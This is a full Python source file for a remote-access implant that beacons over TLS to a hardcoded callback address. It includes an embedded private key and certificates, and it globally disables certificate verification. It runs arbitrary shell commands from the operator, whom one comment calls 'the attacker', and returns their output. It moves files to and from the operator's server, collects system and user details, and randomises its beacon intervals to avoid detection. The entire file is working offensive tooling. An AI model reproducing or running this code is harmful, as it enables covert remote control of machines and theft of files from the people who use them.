from socket import socket,AF_INET,SOCK_STREAM,SO_KEEPALIVE,SOL_SOCKET
from ssl import create_default_context,Purpose
import platform, ssl, subprocess
from printlib import *
from importlib import util
from time import time, sleep
from os import remove, path, getpid, kill, getlogin, name, chdir, getcwd, system
from datetime import datetime
from sys import exit,exc_info,argv
from signal import SIGTERM
from random import randint, uniform, choice
from datetime import datetime
import argparse,base64

#IGNORE SSL CHECKS

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context

UUID = "c60a59df-c3e1-11ea-a17a-bc14ef68ef25"   #python -c 'import uuid; print(uuid.uuid1())'
remote_ip = '10.0.0.4'
remote_port = 8081
server_sni_hostname = ''
VERBOSE = True
DEBUG = True
OUTPUT_FILE = True
OUTPUT_FILE_DIR = getcwd()

DEVNULL = subprocess.DEVNULL
BEACON_INTERVAL_DEFAULT = 30    #in seconds
BEACON_INTERVAL_MEM = BEACON_INTERVAL_DEFAULT
BEACON_INTERVAL_HDD = None
BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
CURRENT_WORKING_DIR = getcwd()
RECONNECT_ATTEMPTS = 5 #immediately upon disconnect

def get_time():
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    return current_time

def log_line(line):
    try:
        with open(path.join(OUTPUT_FILE_DIR,"log"),"a+",encoding="utf8") as log_file:
            log = get_time() + " " + line
            log_file.write(log+"\n")
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            print_fail("Unable to Write Log File")

log = "Current Working Directory: " + getcwd()
chdir(path.dirname(argv[0]))
OUTPUT_FILE_DIR = getcwd()
if DEBUG:
    print(log)
    if OUTPUT_FILE:
        log_line(log)
    log = "New Working Directory: " + getcwd()
    print(log)
    if OUTPUT_FILE:
        log_line(log)
try:
    if name  == "nt":
        winreg_exists = util.find_spec('winreg')
        if winreg_exists:
            import winreg
except:
    if DEBUG:
        print_warn(exc_info())
        
    if OUTPUT_FILE:
        log_line(str(exc_info()))

system('chcp 65001')

def create_keys():
    server_cert ='''\
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUP6DvhuFs2TjmBbb1WwF6Zogv1 e8wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDAyMjgwNTU5MzlaFw0zMDAy
MjUwNTU5MzlaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQC+7zcGw6R/OnPFm+hKZYGPiM4/imSoEMUCgZcDwv7m
/c2O9pB6Y5hhe6wtaLz8cTjVsfHpTRECzlAqxwjSLPjHzBkY639QHnOd+R9VSX9E
WQEslo6i1YRkRR8B8XL1eJnili8h1uLZ/rQmdxAtIwtoJKgsEYaW7Dzh4RWo5nlm
ZUM6Hfh3T3HupyqvXmi4b+EEdCOVMvDZps8QJuHH6ypmbHhF6vwWjoAp1qKZIeqY
ZR+b71DXKBkKRqIsf0ycjZyJxOE0YRqHA+hOtKCGSwN9aMWhG6sQGlpUdbrk+9pz
ATA8AitVE94ZIC0rFLL5ziCLtjPcScnG0i4D6FFmygHPAgMBAAGjUzBRMB0GA1Ud
DgQWBBTNhLMivwkItr7Be3VMj9/6KM3yiTAfBgNVHSMEGDAWgBTNhLMivwkItr7B
e3VMj9/6KM3yiTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAx
zhmr0jwUkvqeAl46GOUDslgaOrCVYwJj/4R1cGRCb0bQKPbLmoBRn+YDl1wa2ro5
pl/0qro2g4n9f31kFVm3jn3132CONabxz4+pn2hvHOV+qvJ1cs0ZuIRyAX5oYSgF
h8jRgw5kMzLy4zdXXTovEW1nsjO7G3SUc9GC3EOOx3DFRUDC4rgUzBrRCxh2j574
6zrFqAgMD7QKAbMfttcn0JoFV71IPH1X/SATSgHHBfs6DkVYtI4/tPkMkxOBf5hq
CwszvFk5+ZOFJ+o66mAc4OSkt8aiRMxjHg3vSjsrW4EVqGRz+ohuoDDoKIxlgRqN
H1fwfP6xGzn/UjUTNWuz
-----END CERTIFICATE-----'''
    try:
        with open("server_cert",'w') as file:
            file.write(server_cert)
    except:
        if VERBOSE:
            print_fail("Unable to create server key")
            print(getcwd())
            print(exc_info())
            if OUTPUT_FILE:       
                log_line("Unable to create server key")
                log_line(getcwd())
                log_line(str(exc_info()))
                

    client_cert = '''\
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUbpFUojamR1OPhQJUwDJzW0W1sG8wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDAyMjgwNjAwMDBaFw0yMTAy
MjcwNjAwMDBaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQClYnr6PZrghUhxwiwHvNl1zWhc0IDXW/odOe4/mRHS
K5wVhdj25tLA520o/fVxwYt5tSwW48HM2PIRJDeABH88WqlLfILogv6/C5OkJrSD
tyrbNjlUx1yqbiAWbsE6Jmss5CySzHTZgbs5QGVvnxW5DcfQlEWa4pYDLemeETy9
kabLFWPMDkbQq6M8Rc3GAXuTKwW5ym6pBBonVqB0p/nvxMeAh6eQS61D73uv9d0N
AcWWCedpjz+4Js2tYLBMuKrwGOao9RiGg1Su0y9vIp/0n3XJ4HBsTcxMF664e8ED
I7IC3SwCOhWrmhSA8eQ1Kws5dJ8ButW5+80Ikbz/kAeFAgMBAAGjUzBRMB0GA1Ud
DgQWBBSpeICTMVzbAL74rkG7Rp5cdpT/OjAfBgNVHSMEGDAWgBSpeICTMVzbAL74
rkG7Rp5cdpT/OjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQCY
VBDMh+y9uBAn/1S/8xmvttQQYakw1YG0wY5APoCJZPp+SurMh+xDc1dhEW6W5n65
wQTh6VmLwkfBRRLfHBWAtcFO5hW7N8MlvCerXzh30Mld37FrW0KnW7XNpXwC+XJB
KbhxF9OS9fwrQwZa4rtx8xWl93rnxuHG1ZRAPnar79DNCXII3/oh/kfcyaTugrWK
ijlopmmNvPM+rur2VGv8FheKUkyUNM0U7l6NR17ao/hVIzq7ga86e5Xidl8/gbUH
IbWmkL3apSpCeQx2nKBMwT8c+lJixO40meyxpIzTnEuTSHEXYY5/h2jlvNmLcScO
z/BKKDg5xkjlf0TAyaAo
-----END CERTIFICATE-----'''
    try:
        with open("client_cert",'w') as file:
            file.write(client_cert)
    except:
        if VERBOSE:
            print_fail("Unable to create client cert")
            print(getcwd())
            print(exc_info())
            if OUTPUT_FILE:       
                log_line("Unable to create client cert")
                log_line(getcwd())
                log_line(str(exc_info()))
    client_key= '''\
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClYnr6PZrghUhx
wiwHvNl1zWhc0IDXW/odOe4/mRHSK5wVhdj25tLA520o/fVxwYt5tSwW48HM2PIR
JDeABH88WqlLfILogv6/C5OkJrSDtyrbNjlUx1yqbiAWbsE6Jmss5CySzHTZgbs5
QGVvnxW5DcfQlEWa4pYDLemeETy9kabLFWPMDkbQq6M8Rc3GAXuTKwW5ym6pBBon
VqB0p/nvxMeAh6eQS61D73uv9d0NAcWWCedpjz+4Js2tYLBMuKrwGOao9RiGg1Su
0y9vIp/0n3XJ4HBsTcxMF664e8EDI7IC3SwCOhWrmhSA8eQ1Kws5dJ8ButW5+80I
kbz/kAeFAgMBAAECggEBAIF2U9or+18iNpGGdD0iYgBLaRSuywzKnUHfpVb3lfG1
3ZsjibHNAtGq19Ks6kPARFRjtD2+0Ghwsx0kAqYd3xP5zGig8UDdulkG0O5AtjId
YljzW3G4Fhv71PZ6gJvqkx8zBolrr1TMryij9kOofrK7zNzEFLCoCtI2UJhB2hBx
/5SqSixi7qirhrdFdreB8oTJJvNseIjroA8T5Ch+6UqEO6KxptBLyZmesiA9Z5YQ
pCk5jpLbKkqy1JGgyQUfb9p4MpHlYjH34l/mGRx4DfTwgAIH3Y8NlrPgykouXr6B
u3kVYsXVIEPC/1zkNNb6gbqK/QqUyzX13QW/8x3vqwECgYEA1IiJmqUklSV3C0X8
ryxnt3JFksWQpz08oW1mQdKpxePzjJmakUYlKdl4TPh3CDeCh+gifdtxLy/NovQ2
7U7h5TyhT/HBbY8jpHX82CFIh1cuzXDFWuus3UxHm3OqFJ2qUAxLwSukbpnSdRap
3EtiBVNXeHjhsfBLte6tgYTJNOUCgYEAxzVpsIH51i2TJfcVSGlu692cqlSvuWbo
eJAplFqUdH2aXl3khs5GM2Nl7ZoRAEUkuukWY8ZL/MM+0CQ2jY73sRpAiw7yf0lc
LHSiwjz9XR+g4Hav/9dM3L+QNi81czS4CbcCpwg/A8U0vV21ZPZA8MuxYyVeAZJ+
EKLNzX1B/iECgYA4mWfz3Bji80hBo1DIoc25J+BpVt3P+9nir4y06NI3lh4tClcE
aybIf1avQNgKQyYq5WISHFeHFnbv95ONHR3Be6UF8j7t21nFmXpNYIe9KzWWlnqo
XOz7Pi4vstzPgrFxgeTGu8Wdgq9uaSuxNA4Vlv1LYv3P8ktnVvmz7VXcFQKBgATu
7rIfVeeW81jyWIWVjtiqgVG6jSuDP+iUcWMqJxkHb0Y8/wbTnutw37pVoWwnSjSS
xyorZABbeXfAHdW9n6a0JrsK4LiEQZMcRFeZGREwUlScu9kTJOUmnVSqMKGswY4E
CT3Ht3/JZ3f1FSPt8UfFU5xH9Z8GWLbiwUQAgRzhAoGARVxLAHuUNCbbrZQESN/6
vU4QrlqMsOaEzNRfwfwKQidK4jbzvTZMzADjQodHhq0x/yv3SVL5Z2kP6VEXIkji
kol5xIDAD/43O2UzDTXFW0hZk4CFy7EvD9PpBXpl0PtYiojw6rHaHJWeXXSe9+LJ
TZdCKivQ2PsE9Uw8BwCZYJI=
-----END PRIVATE KEY-----'''
    try:
        with open("client_key",'w') as file:
            file.write(client_key)
    except:
        if VERBOSE:
            print_fail("Unable to create client key")
            print(getcwd())
            print(exc_info())
            if OUTPUT_FILE:       
                log_line("Unable to create client key")
                log_line(getcwd())
                log_line(str(exc_info()))

def push_uuid(conn):
    send_data(conn, UUID)



def get_system_time(conn):
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    return current_time

def delete_keys():
    try:
        remove("client_key")
        remove("client_cert")
        remove("server_cert")
    except FileNotFoundError:
        if DEBUG:
            print_warn("Unable to Delete SSL Keys")
            if OUTPUT_FILE:       
                log_line("Unable to Delete SSL Keys")
            

def sysinfo():
    date_time = datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S')
    sys_info ="""
Current PID: {}
Current User: {}

Local Time: {}
system: {}
release: {}
version: {}
machine: {}
processor: {}
node: {}""".format(getpid(),getlogin(),date_time,platform.system(),platform.release(),platform.version(),platform.machine(),platform.processor(),platform.node())
    return sys_info

def base64_encode(message):
    try:
        if type(message) is not bytes:
            message_bytes = message.encode('utf8')
        else:
            message_bytes = message.decode().encode('utf8')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('utf8')
        return base64_message
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            if OUTPUT_FILE:
                log_line(e)       
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
    

def send_data(conn, plain_text):
    if type(plain_text) is int:
        plain_text = str(plain_text)
    msg = plain_text
    try:
        base64_msg = base64_encode(msg + "[END]")
        if DEBUG:
            print("Sending:",base64_msg)
            if OUTPUT_FILE:
                log_line("Sending: {}".format(base64_msg))
        conn.send(base64_msg.encode('utf-8'))
        if VERBOSE:
            print_info("Sent:\n"  +plain_text)
            if OUTPUT_FILE:
                log_line("Sent:\n"  +plain_text)
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            print_fail("Connection Interrupted - Unable to Send")
            if OUTPUT_FILE:
                log_line(e)       
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                log_line("Connection Interrupted - Unable to Send")
    

def file_transfer_get(conn, file_name):      #push to server - response from a 'get'
    filesize = path.getsize(file_name)
    conn.send(f"[file-size]{filesize}".encode())
    try:
        f = open(file_name, 'rb')
        data = f.read(1024)
        f.close()
    except:
        if VERBOSE:
            print_fail("IO Error, Unable to Read File for Transfer")
            if OUTPUT_FILE:
                log_line("IO Error, Unable to Read File for Transfer")
    if VERBOSE:
        print_info("Sending File: " + file_name)
        if OUTPUT_FILE:
            log_line("Sending File: " + file_name)
    try:
        with open(file_name, "rb") as f:
            bytes_read = f.read(1024)
            while bytes_read:
                conn.sendall(bytes_read)
                bytes_read = f.read(1024)
        conn.send("[END]".encode('utf-8'))
        if VERBOSE:
            print_info("Done!")
            if OUTPUT_FILE:
                log_line("Fished Sending File!")

    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            if OUTPUT_FILE:
                log_line(e)       
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))


def file_transfer_put(conn, file_name):     #download from server - response from a 'put'
    file_name = file_name.rstrip("[END]")
    try:
        f = open(file_name,'wb')
        if VERBOSE:
            print_info("Receiving --> {}".format(file_name))
            if OUTPUT_FILE:
                log_line("Receiving --> {}".format(file_name))
        while True: 
            data = conn.recv(1024)
            if data.endswith(b"[END]"):
                f.write(data.rstrip(b"[END]"))
                if VERBOSE:
                    print_good("Transfer completed")
                    if OUTPUT_FILE:
                        log_line("Transfer completed")
                f.close()
                break
            else:
                f.write(data)
        f.close()
    except:
        if DEBUG:
            print_fail("IO Error - Unable to Write File from Server")
            send_data(conn, "INVALID DESTINATION PATH")
            if OUTPUT_FILE:
                log_line("IO Error - Unable to Write File from Server")
def get_cwd():
    global CURRENT_WORKING_DIR
    CURRENT_WORKING_DIR = getcwd()
    if VERBOSE:
        print_info("PWD: {}".format(CURRENT_WORKING_DIR))
        if OUTPUT_FILE:
            log_line("PWD: {}".format(CURRENT_WORKING_DIR))
def get_user():
    username = getlogin()
    return username

def change_cwd(path):
    try:
        chdir(path)
        get_cwd()
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            if OUTPUT_FILE:
                log_line(e)       
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
    return CURRENT_WORKING_DIR

def beacon(conn, data):
    global BEACON_INTERVAL_SETTING
    global BEACON_INTERVAL_MEM
    global RECONNECT_ATTEMPTS
    try:
        temp = data.strip("[BEACON]")
        if temp == "?":
            send_data(conn, BEACON_INTERVAL_SETTING)
        elif temp.isdigit():
            BEACON_INTERVAL_MEM = int(data.strip("[BEACON]"))
            BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
            send_data(conn, "Beacon Setting: {} seconds".format(BEACON_INTERVAL_SETTING))
        elif temp == "START":
            if VERBOSE:
                print_info("Received Beacon Instruction")
            conn.close()
            BEACON_INTERVAL_MEM = None
            RECONNECT_ATTEMPTS = 0
            raise ConnectionResetError
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            if OUTPUT_FILE:
                log_line(e)       
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def kill_term(conn):
    try:
        if VERBOSE:
            print_warn("Received kill command")
            if OUTPUT_FILE:
                log_line("Received kill command")
        conn.close()
        kill(getpid(), SIGTERM)
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            if OUTPUT_FILE:
                log_line(e)       
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def callback_port(conn,data):
    global remote_port
    temp = data.strip("[PORT]")
    if temp == "?":
        send_data(conn,remote_port)
    else:
        try:
            if int(temp) > 0 and int(temp) < 65536:
                remote_port = int(temp)
        except Exception as e:
            if DEBUG:
                print_fail("Unable to change callback port")
                print(e)
                if OUTPUT_FILE:
                    log_line(e)
                    log_line("Unable to change callback port")
                    log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def connect(remote_ip=remote_ip, remote_port=remote_port):
    global RECONNECT_ATTEMPTS
    data = ""
    try:
        context = create_default_context(Purpose.SERVER_AUTH, cafile='server_cert')
        context.check_hostname = False
        context.load_cert_chain(certfile='client_cert', keyfile='client_key')
        delete_keys()
        s = socket(AF_INET, SOCK_STREAM)
        #s.setblocking(0)
        x = s.getsockopt( SOL_SOCKET, SO_KEEPALIVE)
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        #socket.socket = socks.socksocket
        #s = socks.socksocket()
        conn = context.wrap_socket(s, server_side=False)
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            if OUTPUT_FILE:
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
    try:
        if VERBOSE:
            print_info("Trying to connect --> {}:{}".format(remote_ip,remote_port))
            if OUTPUT_FILE:
                log_line("Trying to connect --> {}:{}".format(remote_ip,remote_port))
        conn.connect((remote_ip, remote_port))
        
        if VERBOSE:
            print_good("Connected!")
            print_good("SSL established. Peer: {}".format(conn.getpeercert()))
            if OUTPUT_FILE:
                log_line("Connected!")
                log_line("SSL established. Peer: {}".format(conn.getpeercert()))
        RECONNECT_ATTEMPTS = 5
        get_cwd()
    except ConnectionRefusedError:
        raise ConnectionRefusedError
    except ConnectionResetError:
        raise ConnectionResetError
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            if OUTPUT_FILE:
                log_line(e)       
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
    sock_desc_tracker = []
    try:
        while True:
            data = ""
            while not data.endswith('[END]'):
                if len(sock_desc_tracker) == 30:
                    if len(set(sock_desc_tracker)) == 1:
                        if VERBOSE:
                            print_fail("Lost Connection --> Count: {}".format(len(sock_desc_tracker)))
                            if OUTPUT_FILE:
                                log_line("Lost Connection --> Count: {}".format(len(sock_desc_tracker)))
                        raise ConnectionResetError
                sock_desc_tracker.append(int(conn.fileno()))
                recv = conn.recv(1024)
                recv_decoded = recv.decode('utf-8')
                data = data + recv_decoded
                if data:
                    sock_desc_tracker = []
            data = data[:-5].strip('\n')
            if VERBOSE:
                print_info("Received:\n" + data)
                if OUTPUT_FILE:
                    log_line("Received:\n" + data)
            if '[kill]' == data: # if we got terminate order from the attacker, close the socket and break the loop
                kill_term(conn)
                break
            elif "[BEACON]" in data:
                beacon(conn, data)
            elif "[PORT]" in data:
                callback_port(conn,data)
            elif "[UUID]" in data:
                push_uuid(conn)
            elif "[time]" in data:
                time = get_system_time(conn)
                send_data(conn,time)
            elif "[user]" in data:
                username = get_user()
                send_data(conn,username)
            elif "[get]" in data:  #find file locally then push to remote server
                if VERBOSE:
                    print_info("Received GET")
                    if OUTPUT_FILE:
                        log_line("Received GET")
                file_name = data.split()[1].strip("[END]")
                if path.exists(file_name):
                    if VERBOSE:
                        print_info("File Found! :) --> {}".format(file_name))
                        if OUTPUT_FILE:
                            log_line("File Found! :) --> {}".format(file_name))
                    send_data(conn, "[file-found]")
                    data = ""
                    while not data.endswith('[END]'):
                        if DEBUG:
                            print("Waiting to Transfer...")
                            if OUTPUT_FILE:
                                log_line("Waiting to Transfer...")
                        data = conn.recv(1024).decode('utf-8')
                        if DEBUG:
                            print("DATA: {}".format(data))
                            if OUTPUT_FILE:
                                log_line("DATA: {}".format(data))
                    if "[transfer]" in data:
                        if VERBOSE:
                            print_info("Beginning Transfer!")
                            if OUTPUT_FILE:
                                log_line("Beginning Transfer!")
                        file_transfer_get(conn, file_name)
                else:
                    if VERBOSE:
                        print_info("File not Found :( --> {}".format(file_name))
                        if OUTPUT_FILE:
                            log_line("File not Found :( --> {}".format(file_name))

                    send_data(conn, "[file-not-found]")
                data = ""
            elif "[put]" in data:
                if VERBOSE:
                    print_info("Received PUT")
                    if OUTPUT_FILE:
                        log_line("Received PUT")
                file_name = data.split()[2]
                file_transfer_put(conn, file_name)
            elif data == "sysinfo":
                sys_info = sysinfo()
                send_data(conn, sys_info)
            elif "[pwd]" in data:
                send_data(conn, getcwd())
            elif "[cwd]" in data:
                send_data(conn,change_cwd(data.lstrip("[cwd] ")))
            else: # otherwise, we pass the received command to a shell process
                #cmds = data.split()
                if VERBOSE:
                    print_info("Received cmd --> {}".format(data))
                    if OUTPUT_FILE:
                        log_line("Received cmd --> {}".format(data))
                if data.startswith("start "):
                    try:
                        output = subprocess.call(data.split(" "), timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
                        send_data(conn, "Command Successfully Executed (no output expected)") # send back the result
                    except subprocess.TimeoutExpired:
                        if VERBOSE:
                            print_warn("Command Execution Timeout Expired")
                            if OUTPUT_FILE:
                                log_line("Command Execution Timeout Expired")
                        send_data(conn, "Command Execution Timeout Expired")
                    
                else:
                    try:
                        output = subprocess.run(data, timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
                        if output.stderr != b"":
                            send_data(conn, output.stderr.decode('utf-8')) # send back the errors
                        elif output.stdout == b"":
                            send_data(conn, "ERROR/EMPTY RESPONSE --> {}".format(data))
                        else:
                            try:
                                send_data(conn, output.stdout.decode('utf-8')) # send back the result
                                #send_data(conn, output.stdout)#.decode('utf-8')) # send back the result
                            except UnicodeDecodeError:
                                send_data(conn, output.stdout.decode('cp1251')) # send back the result
                                if OUTPUT_FILE:
                                    log_line("UNICODE ERROR")
                    except subprocess.TimeoutExpired:
                        if VERBOSE:
                            print_warn("Command Execution Timeout Expired")
                            if OUTPUT_FILE:
                                log_line("Command Execution Timeout Expired")
                        send_data(conn, "Command Execution Timeout Expired")
                    except Exception as e:
                        if DEBUG:
                            print_fail("Exception! --> {}".format(e))
                            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                            if OUTPUT_FILE:
                                log_line(e)       
                                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                        send_data(conn,e)
                data = "" #reset the data received
    except Exception as e:
        if DEBUG:
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
            if OUTPUT_FILE:
                log_line(e)       
                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))


def query_beacon():
    global BEACON_INTERVAL_HDD
    global BEACON_INTERVAL_SETTING
    access_registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    try:
        k = winreg.OpenKey(access_registry,r"Software\Classes\.savep")
        BEACON_INTERVAL_HDD = int(winreg.QueryValue(k,None))
        if VERBOSE:
            print_info("Found Registry Beacon Setting: {}".format(BEACON_INTERVAL_HDD))
            if OUTPUT_FILE:
                log_line("Found Registry Beacon Setting: {}".format(BEACON_INTERVAL_HDD))
        BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
    except:
        BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM

def beacon_drift(value=30):
    left_bound = 0
    right_bound = 10
    if VERBOSE:
        print_info("Current Beacon Setting is: {} seconds".format(value))
        if OUTPUT_FILE:
            log_line("Current Beacon Setting is: {} seconds".format(value))
    try:
        left_bound = round(uniform(.95, 1) * value)
        right_bound = round(uniform(1, 1.05) * value)
    except:
        if VERBOSE:
            print_warn("Unable to Calculate a good drift, defaulting to more predictable version")
            if OUTPUT_FILE:
                log_line("Unable to Calculate a good drift, defaulting to more predictable version")
        left_bound = round(choice([.95,.97,.99, 1]) * value)
        right_bound = round(choice([1,1.02,1.04, 1.05]) * value)
    new_interval = randint(left_bound, right_bound)
    if VERBOSE:
        print_info("New Beacon Value is: {} seconds".format(new_interval))
        print_info("REMOTE_HOST: {}:{}".format(remote_ip,remote_port))
        if OUTPUT_FILE:
            log_line("New Beacon Value is: {} seconds".format(new_interval))
            log_line("REMOTE_HOST: {}:{}".format(remote_ip,remote_port))
    return new_interval

def main():
    global BEACON_INTERVAL_SETTING
    global RECONNECT_ATTEMPTS
    global remote_port
    global remote_ip
    parser = argparse.ArgumentParser(description="")
    parser.add_argument('-p', action='store', dest='remote_port',
                            help='Remote Port',default=remote_port)
    parser.add_argument('-i', action='store', dest='remote_ip',
                            help='Remote IP',default=remote_ip)
    args = parser.parse_args()
    remote_ip = args.remote_ip
    remote_port = int(args.remote_port)
    if name == "nt":
        query_beacon()

    while True:
        try:
            create_keys()
            connect(remote_ip,remote_port)
            delete_keys()
        except ConnectionRefusedError:
            if VERBOSE:
                print_fail("Failed to connect")
                print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                if OUTPUT_FILE:
                    log_line("Failed to connect")       
                    log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
        except ConnectionResetError:
            if BEACON_INTERVAL_MEM is not None:
                BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
            elif BEACON_INTERVAL_HDD is not None:
                BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
            else:
                BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
            if DEBUG:
                print_fail("Remote end terminated the connection")
                print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                if OUTPUT_FILE:
                    log_line("Remote end terminated the connection")       
                    log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
        except ConnectionAbortedError:
            exit()
        except Exception as e:
            if DEBUG:
                print(e)
                print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                if OUTPUT_FILE:
                    log_line(e)
                    log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
        finally:
            delete_keys()
            if BEACON_INTERVAL_SETTING is None:
                BEACON_INTERVAL_SETTING =  BEACON_INTERVAL_DEFAULT
            drift = beacon_drift(BEACON_INTERVAL_SETTING)
            
            try:
                if RECONNECT_ATTEMPTS != 0:
                    RECONNECT_ATTEMPTS = RECONNECT_ATTEMPTS - 1
                    if VERBOSE:
                        print_info("Reconnecting...")
                        print_info(f"Remaining Reconnect Attempts Before Drift: {RECONNECT_ATTEMPTS}")
                        if OUTPUT_FILE:
                            log_line("Reconnecting...")
                            log_line(f"Remaining Reconnect Attempts Before Drift: {RECONNECT_ATTEMPTS}")
                else:
                    if VERBOSE:
                        print_info("Sleeping for {}".format(drift))
                        if OUTPUT_FILE:
                            log_line("Sleeping for {}".format(drift))
                    sleep(drift)
                    
            except KeyboardInterrupt:
                if VERBOSE:
                    print_warn("Received Keyboard Interrupt")
                    if OUTPUT_FILE:
                        log_line("Received Keyboard Interrupt")
                exit(0)
            except Exception as e:
                if VERBOSE:
                    print_fail("Critical Failure, Exiting")
                    print(e)
                    print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                    if OUTPUT_FILE:
                        log_line(e)
                        log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                else:
                    pass
try:
    main()
except:
    if DEBUG:
        print(exc_info())
        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
        if OUTPUT_FILE:
            log_line(str(exc_info()))
            log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))